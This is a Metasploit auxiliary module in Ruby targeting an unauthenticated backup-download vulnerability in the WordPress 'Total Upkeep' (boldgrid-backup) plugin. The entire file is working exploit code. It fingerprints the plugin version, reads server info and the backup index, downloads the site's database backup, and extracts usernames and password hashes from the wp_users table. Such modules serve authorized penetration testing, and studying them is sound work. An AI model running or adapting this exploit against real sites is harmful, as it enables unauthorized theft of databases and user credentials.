##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  require 'metasploit/framework/hashes/identify'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Total Upkeep Unauthenticated Backup Downloader',
        'Description' => %q{
          This module exploits an unauthenticated database backup vulnerability in WordPress plugin
          'Boldgrid-Backup' also known as 'Total Upkeep' version < 1.14.10.
          First, `env-info.php` is read to get server information.  Next, `restore-info.json` is
          read to retrieve the last backup file.  That backup is then downloaded, and any sql
          files will be parsed looking for the wp_users INSERT statement to grab user creds.
        },
        'References' => [
          ['EDB', '49252'],
          ['WPVDB', '10502'],
          ['WPVDB', '10503'],
          ['URL', 'https://plugins.trac.wordpress.org/changeset/2439376/boldgrid-backup']
        ],
        'Author' => [
          'Wadeek', # Vulnerability discovery
          'h00die' # Metasploit module
        ],
        'DisclosureDate' => '2020-12-12',
        'License' => MSF_LICENSE
      )
    )
  end

  def run_host(ip)
    unless wordpress_and_online?
      fail_with Failure::NotVulnerable, "#{ip} - Server not online or not detected as wordpress"
    end

    checkcode = check_plugin_version_from_readme('boldgrid-backup', '1.14.10')
    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
      fail_with Failure::NotVulnerable, "#{ip} - A vulnerable version of the 'Boldgrid Backup' was not found"
    end
    print_good("#{ip} - Vulnerable version detected")

    print_status("#{ip} - Obtaining Server Info")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'boldgrid-backup', 'cli', 'env-info.php')
    })

    fail_with Failure::Unreachable, "#{ip} - Connection failed" unless res
    fail_with Failure::NotVulnerable, "#{ip} - Connection failed. Non 200 code received" if res.code != 200
    begin
      data = JSON.parse(res.body)
    rescue StandardError
      fail_with Failure::NotVulnerable, "#{ip} - Unable to parse JSON output.  Check response: #{res.body}"
    end
    output = []
    data.each do |k, v|
      output << "  #{k}: #{v}"
    end
    print_good("#{ip} - \n#{output.join("\n")}")
    path = store_loot(
      'boldgrid-backup.server.info',
      'text/json',
      ip,
      data,
      'env-info.json'
    )
    print_good("#{ip} - File saved in: #{path}")

    print_status("#{ip} - Obtaining Backup List from Cron")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'boldgrid-backup', 'cron', 'restore-info.json')
    })
    fail_with Failure::Unreachable, "#{ip} - Connection failed" unless res
    fail_with Failure::NotVulnerable, "#{ip} - No database backups detected" if res.code == 404
    fail_with Failure::NotVulnerable, "#{ip} - Connection failed. Non 200 code received" if res.code != 200

    begin
      data = JSON.parse(res.body)
    rescue StandardError
      fail_with Failure::NotVulnerable, "#{ip} - Unable to parse JSON output.  Check response: #{res.body}"
    end
    output = []
    data.each do |k, v|
      output << "  #{k}: #{v}"
    end
    print_good("#{ip} - \n#{output.join("\n")}")
    path = store_loot(
      'boldgrid-backup.backup.info',
      'text/json',
      ip,
      data,
      'restore-info.json'
    )
    print_good("#{ip} - File saved in: #{path}")
    unless data['filepath']
      print_bad("#{ip} - no file found")
    end
    # pull a url from the local file system path
    path = data['filepath'].sub(data['ABSPATH'], '')
    print_status("#{ip} attempting download of #{path}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, path)
    })
    fail_with Failure::Unreachable, "#{ip} - Connection failed" unless res
    fail_with Failure::NotVulnerable, "#{ip} - Unable to download" if res.code == 404
    fail_with Failure::NotVulnerable, "#{ip} - Connection failed. Non 200 code received" if res.code != 200
    path = store_loot(
      'boldgrid-backup.backup.zip',
      'application/zip',
      ip,
      res.body,
      path.split('/').last
    )
    print_good("#{ip} - Database backup (#{res.body.bytesize} bytes) saved in: #{path}")

    Zip::File.open(path) do |zip_file|
      # Handle entries one by one
      zip_file.each do |entry|
        # Extract to file
        next unless entry.name.ends_with?('.sql')

        print_status("#{ip} - Attempting to pull creds from #{entry}")
        f = entry.get_input_stream.read
        f.split("\n").each do |l|
          next unless l.include?('INSERT INTO `wp_users` VALUES ')

          columns = ['user_login', 'user_pass']
          table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
          l.split('),(').each do |user|
            user = user.split(',')
            username = user[1].strip
            username = username.start_with?("'") ? username.gsub("'", '') : username
            hash = user[2].strip
            hash = hash.start_with?("'") ? hash.gsub("'", '') : hash
            create_credential({
              workspace_id: myworkspace_id,
              origin_type: :service,
              module_fullname: fullname,
              username: username,
              private_type: :nonreplayable_hash,
              jtr_format: identify_hash(hash),
              private_data: hash,
              service_name: 'Wordpress',
              address: ip,
              port: datastore['RPORT'],
              protocol: 'tcp',
              status: Metasploit::Model::Login::Status::UNTRIED
            })
            table << [username, hash]
          end
          print_good(table.to_s)
        end
      end
    end
    print_status("#{ip} - finished processing backup zip")
  end
end
